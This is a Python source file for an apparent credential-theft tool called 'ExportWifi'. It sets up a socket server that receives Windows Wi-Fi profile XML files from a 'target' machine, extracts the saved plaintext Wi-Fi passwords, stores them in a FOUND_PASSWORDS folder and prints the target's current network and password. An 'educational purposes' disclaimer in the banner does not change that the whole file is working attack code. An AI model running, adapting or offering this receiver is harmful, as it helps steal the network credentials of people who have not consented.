import ast
import os
import socket
import shutil

class WlanServer:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.idx = None

    def get_key_material(self, file):
        for line in file:
            if "keyMaterial" in line:
                teilen = line.split(">")
                lst_passwort = teilen[1].split("<")
                current_password = lst_passwort[0]
                return current_password

        return None


    def start(self):
        gui = """
___________                             __   __      __.__  _____.__ 
\_   _____/__  _________   ____________/  |_/  \    /  \__|/ ____\__|
 |    __)_\  \/  /\____ \ /  _ \_  __ \   __\   \/\/   /  \   __\|  |
 |        \>    < |  |_> >  <_> )  | \/|  |  \        /|  ||  |  |  |
/_______  /__/\_ \|   __/ \____/|__|   |__|   \__/\  / |__||__|  |__|
        \/      \/|__|                             \/                

        ~Created by: Kill0ger~
        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!        
        """
        print(gui)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            server.bind((self.ip, self.port))
            server.listen(5)

        except socket.gaierror:
            print("INSERT A VALID IP-ADDRESS")
            quit()

        print("Waiting for connection....")
        client_socket, adresse = server.accept()
        print(f"Connection with {adresse}")

        buffer = 20
        # Gets the data
        str_dict = ""
        while True:
            msg = client_socket.recv(buffer).decode()
            if len(msg) <= 0: break
            str_dict += msg
            # Everything will be stored in name

        inhalt = ast.literal_eval(str_dict)
        # This function makes a string to a directory
        wlan_liste = []

        for wlan_name, value in inhalt.items():
            if os.path.exists(wlan_name): os.remove(wlan_name)

            if wlan_name != "CURRENTWIFI":
                # All the wifi files will be stored in wlan_liste
                wlan_liste.append(wlan_name)
                with open(wlan_name, "a+") as file:
                    file.write(value)

        current_name_space = inhalt["CURRENTWIFI"]
        # Gets the cureentwifi of the target
        current_name = current_name_space.replace(" ", "")
        check = 0
        found = "FOUND_PASSWORDS"
        xmlfiles = "XML_FILES"

        if found not in os.listdir():
            # This only here to create a directory
            os.system(f"mkdir {found}")

        for wlan in wlan_liste:
            if current_name in wlan:
                with open(wlan, "r+") as file:
                    current_password = self.get_key_material(file)
                    # This function gets the password of the wifi_file
                    check += 1

            new_name = wlan[::-1]
            # This will store the wifi file backwards so its easier to find the wifiname
            this_name = new_name[4:][::-1]
            # This gets the wifi file without the file extension ".xml" and stores them back backwards
            for each in wlan:
                if "-" in each:
                    self.idx = wlan.index("-")
                    # This gets the index of "-" because the file in every country is different
                    break

            filename_wlan = this_name[self.idx + 1:]
            # This gets the excact filename

            with open(wlan, "r+") as this_file:
                this_password = self.get_key_material(this_file)
                # Gets the password of the wifi_file

            os.chdir(f"{found}")
            # Changes the directory so every wifi file with txt extension will be stored in "XML_FILES"
            with open(f"{filename_wlan}.txt", "a+") as wlan_file:
                if this_password is None: this_password = "encrypted password"
                # Checks if the file has a password
                wlan_file.write(f"WLAN: {filename_wlan}\n\nPassword of {filename_wlan}: {this_password}")
            os.chdir("..")

        if xmlfiles not in os.listdir():
            # Makes a directory if it isn't already made
            os.system(f"mkdir {xmlfiles}")

        for each_xml_file in wlan_liste:
            # Moves all wifi files with xml extension to "XML_FILES"
            try:
                shutil.move(each_xml_file, f"{xmlfiles}")

            except shutil.Error:
                # Checks if the file already exists
                print("This XML File already exists")

        print("\nConnection has been established")
        print(f'{len(wlan_liste)} Wifi files have been saved to "FOUND_PASSWORDS" and "XML_FILES"')
        if check >= 1:
            print(
                f"The current WI-FI and Password of the target is \n\nWI-FI: {current_name}\nPassword: {current_password}")
        else:
            print(f"The current WI-FI of the target is \n\nWI-FI: {current_name}\nThe password couldn't be detected")
        print("THANK YOUR FOR USING EXPORTWIFI")
